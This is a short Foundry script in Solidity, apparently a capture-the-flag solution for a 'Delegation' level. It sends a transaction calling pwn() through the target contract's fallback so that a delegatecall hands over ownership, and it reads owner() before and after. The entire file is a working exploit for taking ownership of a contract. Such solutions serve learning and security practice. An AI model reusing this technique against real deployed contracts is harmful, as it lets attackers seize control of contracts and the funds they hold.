// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level6.sol";

contract POC is Script {
    Delegation level6 = Delegation(0x8EFf5F7b50043e9a7394bD2d95919364a1e91465);

    function run() external {
        vm.startBroadcast();

        level6.owner();
        (bool success, ) = address(level6).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
        level6.owner();

        vm.stopBroadcast();
    }
}
